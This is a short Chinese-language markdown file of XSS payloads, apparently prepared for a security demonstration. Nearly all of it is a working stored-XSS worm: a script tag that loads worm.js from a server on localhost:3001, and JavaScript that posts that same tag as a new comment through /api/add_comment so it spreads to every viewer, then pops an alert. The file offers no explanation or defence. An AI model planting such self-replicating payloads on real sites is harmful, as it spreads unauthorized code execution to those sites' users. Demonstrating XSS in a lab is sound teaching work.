# xss 演示脚本 payload
下面是我们演示会使用到的 xss payload


## xss worm（蠕虫）
``` html

<script src="http://localhost:3001/worm.js"></script>
```
```js
var commentText = '<script src="http://localhost:3001/worm.js"></script>'
$.ajax({    
  type:'post',        
  url:'/api/add_comment',    
  data: {
    text: commentText,
    date: +Date.now()
  },   
}); 
alert('badyboy is cool');
```